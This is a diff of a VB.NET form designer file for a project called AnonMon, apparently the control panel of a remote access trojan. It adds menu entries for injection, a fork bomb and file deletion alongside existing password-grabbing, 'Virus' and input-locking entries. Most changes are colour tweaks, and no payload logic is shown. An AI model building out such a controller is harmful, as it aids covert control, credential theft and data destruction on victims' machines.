@@ -69,6 +69,7 @@ Partial Class Form1
         Me.StartIconHideToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
         Me.ShowStartIconToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.GetPasswordsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.InjectionToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.MiscToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.MessageToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.PowerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
@@ -83,6 +84,10 @@ Partial Class Form1
         Me.AddToStarUpToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.VirusToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.RedScreenToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.ForkBombToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.DeleteAllFilesOnDesktopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.DeleteFilesToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.DeleteFilesRebootToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.ClientToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.CloseDeleteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
@@ -92,6 +97,9 @@ Partial Class Form1
         Me.Test2ToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.ImageList1 = New System.Windows.Forms.ImageList(Me.components)
         Me.XuiCustomGroupbox2 = New XanderUI.XUICustomGroupbox()
+        Me.PictureBox4 = New System.Windows.Forms.PictureBox()
+        Me.PictureBox3 = New System.Windows.Forms.PictureBox()
+        Me.Auto_RECOV = New XanderUI.XUICheckBox()
         Me.XuiCheckBox1 = New XanderUI.XUICheckBox()
         Me.XuiCustomGroupbox1 = New XanderUI.XUICustomGroupbox()
         Me.XuiCustomGroupbox4 = New XanderUI.XUICustomGroupbox()
@@ -102,7 +110,6 @@ Partial Class Form1
         Me.Button1 = New System.Windows.Forms.Button()
         Me.Button2 = New System.Windows.Forms.Button()
         Me.Button3 = New System.Windows.Forms.Button()
-        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
         Me.Label1 = New System.Windows.Forms.Label()
         Me.TabControlExt3 = New HZH_Controls.Controls.TabControlExt()
         Me.TabPage2 = New System.Windows.Forms.TabPage()
@@ -117,8 +124,12 @@ Partial Class Form1
         Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
         Me.Label2 = New System.Windows.Forms.Label()
         Me.PictureBox2 = New System.Windows.Forms.PictureBox()
+        Me.PictureBox5 = New System.Windows.Forms.PictureBox()
+        Me.AUTO_CHK_FILE = New XanderUI.XUICheckBox()
         Me.REMOTE_TOOL.SuspendLayout()
         Me.XuiCustomGroupbox2.SuspendLayout()
+        CType(Me.PictureBox4, System.ComponentModel.ISupportInitialize).BeginInit()
+        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).BeginInit()
         Me.XuiCustomGroupbox1.SuspendLayout()
         Me.XuiCustomGroupbox4.SuspendLayout()
         CType(Me.NumericUpDown2, System.ComponentModel.ISupportInitialize).BeginInit()
@@ -129,6 +140,7 @@ Partial Class Form1
         Me.TabPage4.SuspendLayout()
         CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
         CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
+        CType(Me.PictureBox5, System.ComponentModel.ISupportInitialize).BeginInit()
         Me.SuspendLayout()
         '
         'ListView2
@@ -172,12 +184,13 @@ Partial Class Form1
         '
         Me.REMOTE_TOOL.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
         Me.REMOTE_TOOL.ImageScalingSize = New System.Drawing.Size(24, 24)
-        Me.REMOTE_TOOL.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DesktopManagerToolStripMenuItem, Me.GetPasswordsToolStripMenuItem, Me.MiscToolStripMenuItem, Me.ClientToolStripMenuItem, Me.BuilderToolStripMenuItem, Me.TestToolStripMenuItem1})
+        Me.REMOTE_TOOL.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DesktopManagerToolStripMenuItem, Me.GetPasswordsToolStripMenuItem, Me.InjectionToolStripMenuItem, Me.MiscToolStripMenuItem, Me.ClientToolStripMenuItem, Me.BuilderToolStripMenuItem, Me.TestToolStripMenuItem1})
         Me.REMOTE_TOOL.Name = "ContextMenuStrip1"
-        Me.REMOTE_TOOL.Size = New System.Drawing.Size(203, 184)
+        Me.REMOTE_TOOL.Size = New System.Drawing.Size(203, 214)
         '
         'DesktopManagerToolStripMenuItem
         '
+        Me.DesktopManagerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.DesktopManagerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FileManagerToolStripMenuItem, Me.TaskManagerToolStripMenuItem, Me.RemoteViewerToolStripMenuItem, Me.ChangeWallPaperToolStripMenuItem, Me.TaskBarToolStripMenuItem, Me.MouseToolStripMenuItem, Me.KeyboardToolStripMenuItem, Me.IconsToolStripMenuItem, Me.StartIconToolStripMenuItem})
         Me.DesktopManagerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.DesktopManagerToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.a1a5b9494d50bb3754bba547f2d88487_computer_monitor_flat_icon_bmpy_vexels__1_
@@ -187,7 +200,7 @@ Partial Class Form1
         '
         'FileManagerToolStripMenuItem
         '
-        Me.FileManagerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.FileManagerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.FileManagerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.FileManagerToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.folder_IC1
         Me.FileManagerToolStripMenuItem.Name = "FileManagerToolStripMenuItem"
@@ -196,7 +209,7 @@ Partial Class Form1
         '
         'TaskManagerToolStripMenuItem
         '
-        Me.TaskManagerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.TaskManagerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.TaskManagerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.TaskManagerToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_system_task
         Me.TaskManagerToolStripMenuItem.Name = "TaskManagerToolStripMenuItem"
@@ -205,7 +218,7 @@ Partial Class Form1
         '
         'RemoteViewerToolStripMenuItem
         '
-        Me.RemoteViewerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.RemoteViewerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.RemoteViewerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StartToolStripMenuItem, Me.StopToolStripMenuItem})
         Me.RemoteViewerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.RemoteViewerToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_windows_cliegnt_32
@@ -215,7 +228,7 @@ Partial Class Form1
         '
         'StartToolStripMenuItem
         '
-        Me.StartToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.StartToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.StartToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.StartToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_record_64
         Me.StartToolStripMenuItem.Name = "StartToolStripMenuItem"
@@ -224,7 +237,7 @@ Partial Class Form1
         '
         'StopToolStripMenuItem
         '
-        Me.StopToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.StopToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.StopToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.StopToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_stop_64
         Me.StopToolStripMenuItem.Name = "StopToolStripMenuItem"
@@ -233,7 +246,7 @@ Partial Class Form1
         '
         'ChangeWallPaperToolStripMenuItem
         '
-        Me.ChangeWallPaperToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.ChangeWallPaperToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.ChangeWallPaperToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.ChangeWallPaperToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_pictures_folder
         Me.ChangeWallPaperToolStripMenuItem.Name = "ChangeWallPaperToolStripMenuItem"
@@ -243,7 +256,7 @@ Partial Class Form1
         '
         'TaskBarToolStripMenuItem
         '
-        Me.TaskBarToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.TaskBarToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.TaskBarToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.HideToolStripMenuItem, Me.ShowToolStripMenuItem, Me.HideAppsToolStripMenuItem, Me.ShowAppsToolStripMenuItem})
         Me.TaskBarToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.TaskBarToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_minimize_window_641
@@ -253,7 +266,7 @@ Partial Class Form1
         '
         'HideToolStripMenuItem
         '
-        Me.HideToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.HideToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.HideToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.HideToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_hide
         Me.HideToolStripMenuItem.Name = "HideToolStripMenuItem"
@@ -262,7 +275,7 @@ Partial Class Form1
         '
         'ShowToolStripMenuItem
         '
-        Me.ShowToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.ShowToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.ShowToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.ShowToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_edye
         Me.ShowToolStripMenuItem.Name = "ShowToolStripMenuItem"
@@ -271,7 +284,7 @@ Partial Class Form1
         '
         'HideAppsToolStripMenuItem
         '
-        Me.HideAppsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.HideAppsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.HideAppsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.HideAppsToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_hide1
         Me.HideAppsToolStripMenuItem.Name = "HideAppsToolStripMenuItem"
@@ -280,7 +293,7 @@ Partial Class Form1
         '
         'ShowAppsToolStripMenuItem
         '
-        Me.ShowAppsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.ShowAppsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.ShowAppsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.ShowAppsToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_edye1
         Me.ShowAppsToolStripMenuItem.Name = "ShowAppsToolStripMenuItem"
@@ -289,7 +302,7 @@ Partial Class Form1
         '
         'MouseToolStripMenuItem
         '
-        Me.MouseToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.MouseToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.MouseToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.SwapMouseButtonToolStripMenuItem, Me.MouseLockingToolStripMenuItem})
         Me.MouseToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.MouseToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_moussdfsdfe
@@ -299,7 +312,7 @@ Partial Class Form1
         '
         'SwapMouseButtonToolStripMenuItem
         '
-        Me.SwapMouseButtonToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.SwapMouseButtonToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.SwapMouseButtonToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ONToolStripMenuItem, Me.OFFToolStripMenuItem})
         Me.SwapMouseButtonToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.SwapMouseButtonToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_swap_641
@@ -310,7 +323,7 @@ Partial Class Form1
         '
         'ONToolStripMenuItem
         '
-        Me.ONToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.ONToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.ONToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.ONToolStripMenuItem.Name = "ONToolStripMenuItem"
         Me.ONToolStripMenuItem.Size = New System.Drawing.Size(95, 22)
@@ -318,7 +331,7 @@ Partial Class Form1
         '
         'OFFToolStripMenuItem
         '
-        Me.OFFToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.OFFToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.OFFToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.OFFToolStripMenuItem.Name = "OFFToolStripMenuItem"
         Me.OFFToolStripMenuItem.Size = New System.Drawing.Size(95, 22)
@@ -326,7 +339,7 @@ Partial Class Form1
         '
         'MouseLockingToolStripMenuItem
         '
-        Me.MouseLockingToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.MouseLockingToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.MouseLockingToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LeftClickToolStripMenuItem, Me.RightButtonToolStripMenuItem, Me.MouseMovingToolStripMenuItem, Me.AllToolStripMenuItem})
         Me.MouseLockingToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.MouseLockingToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.iconfinder_mouse_delete_84782
@@ -336,7 +349,7 @@ Partial Class Form1
         '
         'LeftClickToolStripMenuItem
         '
-        Me.LeftClickToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.LeftClickToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.LeftClickToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LeftLockToolStripMenuItem, Me.LeftUnlockToolStripMenuItem})
         Me.LeftClickToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.LeftClickToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_left_cgglick_32
@@ -346,7 +359,7 @@ Partial Class Form1
         '
         'LeftLockToolStripMenuItem
         '
-        Me.LeftLockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.LeftLockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.LeftLockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.LeftLockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_locks_64
         Me.LeftLockToolStripMenuItem.Name = "LeftLockToolStripMenuItem"
@@ -355,7 +368,7 @@ Partial Class Form1
         '
         'LeftUnlockToolStripMenuItem
         '
-        Me.LeftUnlockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.LeftUnlockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.LeftUnlockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.LeftUnlockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_padlosqdck_64
         Me.LeftUnlockToolStripMenuItem.Name = "LeftUnlockToolStripMenuItem"
@@ -364,7 +377,7 @@ Partial Class Form1
         '
         'RightButtonToolStripMenuItem
         '
-        Me.RightButtonToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.RightButtonToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.RightButtonToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RightLockToolStripMenuItem, Me.RightUnlockToolStripMenuItem})
         Me.RightButtonToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.RightButtonToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_mouse_right_click_642
@@ -374,7 +387,7 @@ Partial Class Form1
         '
         'RightLockToolStripMenuItem
         '
-        Me.RightLockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.RightLockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.RightLockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.RightLockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_locks_64
         Me.RightLockToolStripMenuItem.Name = "RightLockToolStripMenuItem"
@@ -383,7 +396,7 @@ Partial Class Form1
         '
         'RightUnlockToolStripMenuItem
         '
-        Me.RightUnlockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.RightUnlockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.RightUnlockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.RightUnlockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_padlosqdck_64
         Me.RightUnlockToolStripMenuItem.Name = "RightUnlockToolStripMenuItem"
@@ -392,7 +405,7 @@ Partial Class Form1
         '
         'MouseMovingToolStripMenuItem
         '
-        Me.MouseMovingToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.MouseMovingToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.MouseMovingToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.MouveLockingToolStripMenuItem, Me.MouveUnlockToolStripMenuItem})
         Me.MouseMovingToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.MouseMovingToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_move_32
@@ -402,7 +415,7 @@ Partial Class Form1
         '
         'MouveLockingToolStripMenuItem
         '
-        Me.MouveLockingToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.MouveLockingToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.MouveLockingToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.MouveLockingToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_locks_64
         Me.MouveLockingToolStripMenuItem.Name = "MouveLockingToolStripMenuItem"
@@ -411,7 +424,7 @@ Partial Class Form1
         '
         'MouveUnlockToolStripMenuItem
         '
-        Me.MouveUnlockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.MouveUnlockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.MouveUnlockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.MouveUnlockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_padlosqdck_64
         Me.MouveUnlockToolStripMenuItem.Name = "MouveUnlockToolStripMenuItem"
@@ -420,7 +433,7 @@ Partial Class Form1
         '
         'AllToolStripMenuItem
         '
-        Me.AllToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.AllToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.AllToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.AllLockToolStripMenuItem, Me.AllUnlockToolStripMenuItem})
         Me.AllToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.AllToolStripMenuItem.Name = "AllToolStripMenuItem"
@@ -429,7 +442,7 @@ Partial Class Form1
         '
         'AllLockToolStripMenuItem
         '
-        Me.AllLockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.AllLockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.AllLockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.AllLockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_locks_64
         Me.AllLockToolStripMenuItem.Name = "AllLockToolStripMenuItem"
@@ -438,7 +451,7 @@ Partial Class Form1
         '
         'AllUnlockToolStripMenuItem
         '
-        Me.AllUnlockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.AllUnlockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.AllUnlockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.AllUnlockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_padlosqdck_64
         Me.AllUnlockToolStripMenuItem.Name = "AllUnlockToolStripMenuItem"
@@ -447,7 +460,7 @@ Partial Class Form1
         '
         'KeyboardToolStripMenuItem
         '
